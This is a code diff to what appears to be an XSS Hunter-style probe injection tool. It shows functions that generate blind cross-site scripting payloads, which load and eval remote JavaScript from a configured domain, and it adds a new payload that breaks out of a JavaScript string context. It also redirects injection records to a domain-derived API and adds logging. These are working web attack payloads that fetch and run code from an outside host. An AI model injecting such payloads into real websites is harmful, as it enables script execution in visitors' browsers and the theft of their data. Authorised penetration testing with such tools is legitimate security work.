@@ -8,7 +8,7 @@ import base64
 
 def debugit( text ):
     f = open( 'log.txt', 'a')
-    f.write( text + "\n" )
+    f.write( str(text) + "\n" )
     f.close()
 
 try:
@@ -47,6 +47,8 @@ def payload_id_to_payload( payload_id, payload_token ):
         return '<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//' + settings["domain"] + '/' + payload_token + '");a.send();</script>'
     elif payload_id == "getscript_payload":
         return '<script>$.getScript("//' + settings["domain"] + '/' + payload_token + '")</script>'
+    elif payload_id == "getscript_from_js_payload":
+	return "\";jQuery.getScript(\"//{domain}/{token}\");//".format(domain=settings['domain'], token=payload_token)
     else:
         return "\"><script src=https://" + settings["domain"] + '/' + payload_token + "></script>"
 
@@ -131,11 +133,14 @@ def replace_with_probe_markers(input_text, context, probe_marker_list, urlencode
 
 
 def notify_probe_server(request_details, context):
+    rec_url = 'https://api'+settings['domain'][settings['domain'].index('.'):]+'/api/record_injection'
     fut = futures_sess.post(
-            "https://api.xsshunter.com/api/record_injection",
+            rec_url,
             headers={"Accept": "application/json"},
-            json=request_details,
+            json=request_details
     )
+    debugit(request_details)
+    debugit('\n\n')
     fut.add_done_callback(lambda x: probe_sent_cb(x, context))
 
 
